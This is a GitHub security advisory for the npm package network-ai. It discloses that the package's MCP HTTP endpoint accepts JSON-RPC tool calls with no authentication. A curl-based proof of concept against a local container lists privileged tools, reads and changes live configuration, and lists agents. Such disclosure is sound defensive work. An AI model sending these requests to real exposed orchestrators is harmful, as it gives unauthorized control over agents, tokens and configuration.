# [H] Network-AI missing authentication on MCP HTTP endpoint, which allows unauthenticated privileged tool calls

## Summary
Severity: High
Advisory: GHSA-fj4g-2p96-q6m3
CVE: CVE-2026-42856
CWE: CWE-306
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-05-05
Source: https://github.com/advisories/GHSA-fj4g-2p96-q6m3
Type: github-advisory

## Affected
- npm: `network-ai` — affected >=0 <5.1.3

## Details
# Security Advisory: Missing Authentication for Critical Function in `Jovancoding/Network-AI`

| Field | Value |
|---|---|
| Project | `Jovancoding/Network-AI` |
| Repository | https://github.com/Jovancoding/Network-AI |
| Affected commit | `c344f2053eb0d49395988f803bf92f2a86b2a0d0` |
| Affected tested version | `5.1.2` |
| Vulnerability type | CWE-306: Missing Authentication for Critical Function |
| Severity | High |
| Authentication required | None |
| Default network exposure | Bind address `0.0.0.0` |
| Reporter validation date | 2026-04-21 |

## Summary

The MCP HTTP transport accepts JSON-RPC `tools/call` requests with no authentication, session, origin, or token check, and dispatches them directly to the orchestrator's tool registry. The default bind address is `0.0.0.0`. As a result, any party with network reachability to the service can enumerate and invoke privileged management tools — including reading and mutating the live orchestrator configuration, listing registered agents, dispatching agents, creating/revoking security tokens, and adjusting global budget ceilings.

## Affected Code

- `bin/mcp-server.ts:75` — server binds to `0.0.0.0` by default.
- `lib/mcp-transport-sse.ts:155` — `handleRPC()` dispatches `tools/call` directly to the provider's `call(toolName, toolArgs)`.
- `lib/mcp-transport-sse.ts:379` — `_handlePost()` parses the JSON-RPC body and calls `this._bridge.handleRPC(rpc)` with no auth check.
- `lib/mcp-tools-control.ts:80` — `config_get` exposes live runtime configuration.
- `lib/mcp-tools-control.ts:197` — `agent_list` exposes registered agents.
- `lib/mcp-tools-control.ts:231` — `config_set` mutates runtime configuration in place: `this._config[key] = parsed`.

## Proof of Concept

The PoC was executed against a local Docker build of the affected commit, bound to `http://localhost:13001`. **No authentication header was sent.** All inner-JSON excerpts below are decoded from the JSON-RPC `result.content[0].text` field for readability; the raw wire transcripts (which contain the literal escaped JSON-RPC envelope) are in `evidence/`.

### Step 1 — list exposed tools (unauthenticated)

```bash
curl http://localhost:13001/tools
```

`HTTP/1.1 200 OK` — body returned 22 tools. Privileged tools observed in the inventory include:

- `config_get`, `config_set` — read and mutate live orchestrator configuration
- `agent_list`, `agent_spawn`, `agent_stop` — enumerate, dispatch, and stop agents
- `token_create`, `token_revoke` — mint and revoke security tokens
- `budget_set_ceiling` — adjust the global token budget ceiling
- `fsm_transition` — drive finite-state-machine transitions
- `blackboard_write`, `blackboard_delete` — mutate the shared blackboard

Full transcript: `evidence/01_get_tools.txt`.

### Step 2 — read live configuration (unauthenticated)

```bash
curl http://localhost:13001/mcp \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"config_get","arguments":{}}}'
```

`HTTP/1.1 200 OK` — decoded inner JSON:

```json
{
  "ok": true,
  "tool": "config_get",
  "data": {
    "blackboardPath": "./swarm-blackboard.md",
    "maxParallelAgents": null,
    "defaultTimeout": 30000,
    "enableTracing": true,
    "grantTokenTTL": 300000,
    "maxBlackboardValueSize": 1048576,
    "auditLogPath": "./data/audit_log.jsonl",
    "trustConfigPath": "./data/trust_levels.json"
  }
}
```

Full transcript: `evidence/02_config_get_before.txt`.

### Step 3 — mutate live configuration (unauthenticated)

```bash
curl http://localhost:13001/mcp \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"config_set","arguments":{"key":"defaultTimeout","value":"12345"}}}'
```

`HTTP/1.1 200 OK` — decoded inner JSON:

```json
{
  "ok": true,
  "tool": "config_set",
  "data": {
    "key": "defaultTimeout",
    "previous": 30000,
    "current": 12345,
    "applied": true
  }
}
```

Full transcript: `evidence/03_config_set.txt`.

### Step 4 — confirm mutation persisted (unauthenticated)

```bash
curl http://localhost:13001/mcp \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"config_get","arguments":{}}}'
```

`HTTP/1.1 200 OK` — decoded inner JSON (relevant key only):

```json
{
  "ok": true,
  "tool": "config_get",
  "data": {
    "defaultTimeout": 12345
  }
}
```

This proves the runtime change applied by step 3 is observable on the next read. Full transcript: `evidence/04_config_get_after.txt`.

### Step 5 — enumerate registered agents (unauthenticated)

```bash
curl http://localhost:13001/mcp \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"agent_list","arguments":{}}}'
```

`HTTP/1.1 200 OK` — decoded inner JSON:

```json
{
  "ok": true,
  "tool": "agent_list",
  "data": {
    "agents": [],
    "count": 0
  }
}
```

This is a privileged management read; the empty array reflects the test environment, not a control. Full transcript: `evidence/05_agent_list.txt`.

### Cleanup — runtime state restored

After the PoC, `defaultTimeout` was restored to `30000` via the same unauthenticated `config_set` (`previous":12345,"current":30000,"applied":true`). All testing was performed against a local Docker container only.

## Impact

- Unauthenticated network access enables full enumeration and invocation of the orchestrator's management functionality.
- An attacker can change runtime configuration (e.g., `defaultTimeout`, `enableTracing`), dispatch or stop agents, mutate the shared blackboard, mint or revoke security tokens, and adjust global budget ceilings.
- The default `0.0.0.0` bind, combined with the absence of any auth gate, increases the likelihood of accidental exposure on any host with a routable interface.

## Suggested Remediation

1. Enforce authentication inside `_handlePost()` before reaching `handleRPC()`. At a minimum, require a shared secret / bearer token loaded from configuration; reject any request that does not present it.
2. Default the bind address to `127.0.0.1`. Require an explicit configuration opt-in to bind to non-loopback interfaces, and warn on startup when binding outside loopback without an authentication mechanism configured.
3. For tool-level defense in depth, gate state-mutating tools (`config_set`, `agent_spawn`, `agent_stop`, `token_create`, `token_revoke`, `budget_set_ceiling`, `fsm_transition`, `blackboard_write`, `blackboard_delete`) behind an explicit authorization check tied to a verified caller identity.

## Verification Environment

- Local Docker container only; no third-party deployment was tested.
- Local build required a minimal Dockerfile fix; the application code path under test was not modified.
- Runtime state (`defaultTimeout`) was restored to default after the PoC.

## Attached Evidence

Files in `evidence/` are raw `curl -i` transcripts captured during the verification sequence above. They are provided as supplementary backup; the key excerpts are already inlined in this report.

| File | Purpose |
|---|---|
|[01_get_tools.txt](https://github.com/user-attachments/files/26950583/01_get_tools.txt) | Step 1 — full `GET /tools` request and 22-tool inventory response |
|[02_config_get_before.txt](https://github.com/user-attachments/files/26950584/02_config_get_before.txt) | Step 2 — full `config_get` request and live configuration response |
|[03_config_set.txt](https://github.com/user-attachments/files/26950585/03_config_set.txt) | Step 3 — full `config_set` request mutating `defaultTimeout` |
|[04_config_get_after.txt](https://github.com/user-attachments/files/26950586/04_config_get_after.txt)| Step 4 — full `config_get` request showing the mutation persisted |
| [05_agent_list.txt](https://github.com/user-attachments/files/26950587/05_agent_list.txt) | Step 5 — full `agent_list` request and response |

## References
- https://github.com/Jovancoding/Network-AI/security/advisories/GHSA-fj4g-2p96-q6m3
- https://nvd.nist.gov/vuln/detail/CVE-2026-42856
- https://github.com/Jovancoding/Network-AI
